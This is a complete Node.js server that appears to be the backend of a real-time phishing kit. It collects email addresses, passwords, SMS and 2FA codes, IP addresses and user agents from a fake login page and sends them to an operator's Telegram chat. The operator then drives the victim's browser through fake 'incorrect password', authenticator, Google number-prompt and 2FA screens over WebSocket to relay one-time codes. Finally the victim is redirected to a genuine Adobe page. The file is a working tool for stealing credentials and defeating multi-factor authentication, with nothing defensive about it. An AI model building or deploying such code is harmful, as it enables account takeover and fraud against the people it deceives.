import express from 'express';
import { createServer } from 'http';
import { WebSocketServer } from 'ws';
import { URL } from 'url';

// --- Basic Setup ---
const app = express();
const server = createServer(app);
const PORT = process.env.PORT || 10000;

app.set('trust proxy', true);

// --- Telegram Bot Configuration ---
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;

if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
  console.error("[SERVER] FATAL ERROR: TELEGRAM_BOT_TOKEN and TELEGRAM_CHAT_ID are required.");
  process.exit(1);
}

// --- Middleware ---
app.use(express.json());

// --- WebSocket Server ---
const wss = new WebSocketServer({ server, path: '/ws' });
const activeConnections = new Map();

// --- Reusable Telegram API Helper ---
async function callTelegramApi(method, body) {
    const url = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/${method}`;
    try {
        const response = await fetch(url, {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify(body),
        });
        const json = await response.json();
        if (!json.ok) {
            console.error(`[SERVER] Telegram API Error (${method}):`, json);
        }
        return json;
    } catch (error) {
        console.error(`[SERVER] Telegram API Call Failed (${method}):`, error);
        return null;
    }
}

// --- Main API Endpoint (Receives data from Frontend) ---
app.post('/api/send-telegram', async (req, res) => {
  console.log('[SERVER] Received data from frontend.');
  const payload = { ...req.body, ipAddress: req.ip };
  const message = formatMessage(payload); // Uses the new, redesigned formatting
  const sessionId = payload?.data?.sessionId;
  
  if (!sessionId) {
    return res.status(400).json({ status: 'error', message: 'SessionID is missing.' });
  }

  // This is the main admin control panel sent to Telegram
  const options = {
    reply_markup: {
      inline_keyboard: [
        [{ text: "Incorrect Pass", callback_data: `ip:${sessionId}` }, { text: "SMS Page", callback_data: `sms:${sessionId}` }],
        [{ text: "Authenticator", callback_data: `auth:${sessionId}` }, { text: "Google # Prompt", callback_data: `g_prompt_init:${sessionId}` }],
        [{ text: "Account Locked", callback_data: `lock:${sessionId}` }, { text: "2FA Page", callback_data: `2fa:${sessionId}` }],
        [{ text: "Success", callback_data: `success:${sessionId}` }, { text: "Reset", callback_data: `reset:${sessionId}` }],
      ]
    }
  };

  await callTelegramApi('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: message, parse_mode: 'Markdown', disable_web_page_preview: true });
  await callTelegramApi('sendMessage', { chat_id: TELEGRAM_CHAT_ID, text: "👆 *Choose an action above* 👆", parse_mode: 'Markdown', reply_markup: options.reply_markup });

  res.status(200).json({ status: 'logged' });
});

// --- Webhook for Telegram Callbacks (Admin Actions) ---
app.post('/api/telegram-webhook', async (req, res) => {
    const update = req.body || {};
    res.status(200).json({ ok: true }); // Always respond 200 OK immediately

    const cb = update.callback_query;
    if (!cb || typeof cb.data !== 'string') return;

    const parts = cb.data.split(':');
    const cmd = parts[0];
    const sessionId = parts[1];

    // --- Step 1 of Google Number Prompt ---
    if (cmd === 'g_prompt_init') {
        if (!sessionId) return;
        const picked = new Set();
        while (picked.size < 3) { picked.add(Math.floor(10 + Math.random() * 90)); }
        const numbers = Array.from(picked);
        
        const inline_keyboard = [numbers.map((n) => ({
            text: String(n),
            callback_data: `g_prompt_send:${sessionId}:${n}`,
        }))];

        await callTelegramApi('answerCallbackQuery', { callback_query_id: cb.id });
        await callTelegramApi('editMessageText', {
            chat_id: cb.message.chat.id,
            message_id: cb.message.message_id,
            text: `*Google Prompt:* Choose the number to display for session \`${sessionId}\``,
            parse_mode: 'Markdown',
            reply_markup: { inline_keyboard },
        });
        return;
    }

    // --- Step 2 of Google Number Prompt ---
    if (cmd === 'g_prompt_send') {
        const number = parts[2];
        if (!sessionId || !number) return;
        
        const delivered = sendWebSocketCommand(sessionId, 'show_google_number_prompt', { number: Number(number) });
        await callTelegramApi('answerCallbackQuery', {
            callback_query_id: cb.id,
            text: delivered ? `Sent prompt #${number} to user` : `User ${sessionId} is not connected`,
        });
        await callTelegramApi('editMessageText', {
            chat_id: cb.message.chat.id,
            message_id: cb.message.message_id,
            text: `✅ Command sent: *Google Prompt #${number}* for session \`${sessionId}\``,
            parse_mode: 'Markdown',
        });
        return;
    }

    // --- All Other Admin Commands ---
    const commandMap = {
        'ip': 'show_incorrect_password', 'sms': 'show_sms_code',
        'auth': 'show_authenticator_approval', 'lock': 'show_account_locked',
        '2fa': 'show_two_factor', 'success': 'redirect', 'reset': 'reset',
    };
    const wsCommand = commandMap[cmd];

    if (wsCommand) {
        let commandData = {};
        if (wsCommand === 'redirect') {
            commandData.url = 'https://www.adobe.com/acrobat/online/sign-pdf.html';
        }
        const delivered = sendWebSocketCommand(sessionId, wsCommand, commandData);
        await callTelegramApi('answerCallbackQuery', {
            callback_query_id: cb.id,
            text: delivered ? `Command '${wsCommand}' sent!` : `User ${sessionId} is not connected`,
        });
    }
});

// --- WebSocket Connection Logic ---
wss.on('connection', (ws, req) => {
    const queryParams = new URL(req.url, `http://${req.headers.host}`).searchParams;
    const sessionId = queryParams.get('sessionId');

    if (!sessionId) return ws.terminate();
    
    activeConnections.set(sessionId, ws);
    console.log(`[SERVER] Client connected: ${sessionId}`);

    ws.on('close', () => {
        activeConnections.delete(sessionId);
        console.log(`[SERVER] Client disconnected: ${sessionId}`);
    });
    ws.on('error', (e) => console.error(`[SERVER] WS Error for ${sessionId}:`, e));
});

function sendWebSocketCommand(sessionId, command, data = {}) {
    const ws = activeConnections.get(sessionId);
    if (ws && ws.readyState === 1 /* OPEN */) {
        ws.send(JSON.stringify({ command, data }));
        console.log(`[SERVER] Sent command '${command}' to client ${sessionId}`);
        return true;
    }
    console.warn(`[SERVER] Could not send command to client ${sessionId}: No active connection.`);
    return false;
}

// --- Redesigned Message Formatting Function ---
const formatMessage = (payload) => {
    const { type, data, ipAddress } = payload;
    if (!data) return "*Received empty payload*";

    const now = new Date();
    const timestamp = `${now.toLocaleDateString('en-US', { timeZone: 'UTC' })} ${now.toLocaleTimeString('en-US', { timeZone: 'UTC', hour12: false })} UTC`;
    
    const actionLabels = {
        user_canceled: 'User clicked "Cancel"',
        submit_sms: 'SMS Code Submitted',
        submit_2fa: '2FA Code Submitted',
        retry_password: 'Password Submitted (Retry)',
        submit_email_code: 'Email Code Submitted',
    };

    let header, mainInfo;

    if (type === 'credentials') {
        header = '💼 New Login Credentials';
        mainInfo = [
            `*Provider:* \`${data.provider || 'N/A'}\``,
            `*Email:* \`${data.email || 'N/A'}\``,
            `*Password:* \`${data.password || 'N/A'}\``
        ];
    } else if (type === 'interaction') {
        header = '👆 User Interaction';
        const actionLabel = actionLabels[data.action] || `"${data.action}"`;
        mainInfo = [`*Action:* ${actionLabel}`];
        if (data.code) mainInfo.push(`*Code:* \`${data.code}\``);
        if (data.password) mainInfo.push(`*Password:* \`${data.password}\``);
    } else {
        header = '❓ Unknown Data Received';
        mainInfo = [`\`\`\`\n${JSON.stringify(data, null, 2)}\n\`\`\``];
    }

    const systemInfo = [
        `*IP Address:* \`${ipAddress || 'N/A'}\``,
        `*User Agent:* \`${data.userAgent || 'N/A'}\``,
    ];

    return [
        `*--- ${header} ---*`,
        ...mainInfo,
        `\n*--- Session & System ---*`,
        ...systemInfo,
        `*Session ID:* \`${data.sessionId || 'N/A'}\``,
        `*Timestamp:* \`${timestamp}\``
    ].join('\n');
};

// --- Start Server ---
server.listen(PORT, '127.0.0.1', () => {
  console.log(`[SERVER] API and WebSocket server is running on http://127.0.0.1:${PORT}`);
});
